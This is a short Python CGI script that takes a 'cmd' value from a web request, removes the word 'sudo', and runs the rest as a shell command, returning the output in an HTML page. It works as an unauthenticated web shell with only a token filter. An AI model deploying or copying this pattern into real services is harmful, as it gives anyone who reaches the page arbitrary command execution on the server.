#!/usr/bin/python3

import subprocess
import cgi

print("content-type: text/html")
print()

form = cgi.FieldStorage()
cmd = form.getvalue("cmd")

if 'sudo' in cmd:
    cmd = cmd.replace('sudo', '')
    print("Cannot allow use of sudo <BR>")

print("command: {} | ".format(cmd))
output = subprocess.getstatusoutput(cmd)

print("status-code: {} | ".format(output[0]))
print()
print("output: <PRE> {} </PRE> \n".format(output[1]))
print("<BR>")

print()

